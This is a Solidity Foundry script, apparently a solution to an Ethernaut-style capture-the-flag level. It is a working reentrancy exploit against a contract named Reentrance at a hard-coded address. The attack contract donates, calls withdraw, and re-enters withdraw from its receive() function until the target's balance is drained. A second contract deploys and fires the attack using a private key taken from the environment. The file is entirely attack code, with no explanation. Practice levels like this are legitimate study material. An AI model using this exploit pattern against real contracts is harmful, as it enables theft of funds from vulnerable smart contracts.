//SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import {Script,console} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reentrancy.sol";

contract ReentrancyAttack {

  Reentrance reEntranceInstance = Reentrance(0x021b65B8904bCB2FeB5C47F5F05aFCB3Bab4c13a);

  
  function attack() external payable {
    reEntranceInstance.donate{value: msg.value}(address(this));
    console.log("Balances: ", reEntranceInstance.balanceOf(address(this)));
    reEntranceInstance.withdraw(msg.value);
    console.log("Balances after withdraw: ", reEntranceInstance.balanceOf(address(this)));
  }

  receive() external payable {
    
    if(address(0x021b65B8904bCB2FeB5C47F5F05aFCB3Bab4c13a).balance >= 0.001 ether) {
      reEntranceInstance.withdraw(0.001 ether);
    }
    console.log("Balances after receive: ", address(0x021b65B8904bCB2FeB5C47F5F05aFCB3Bab4c13a).balance);
  }

  fallback() external payable {
    
}

}
contract ReentrancySolution is Script {

  

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
   ReentrancyAttack reEntracyAttack =  new ReentrancyAttack();
   reEntracyAttack.attack{value: 0.001 ether}();
    vm.stopBroadcast();
  }
}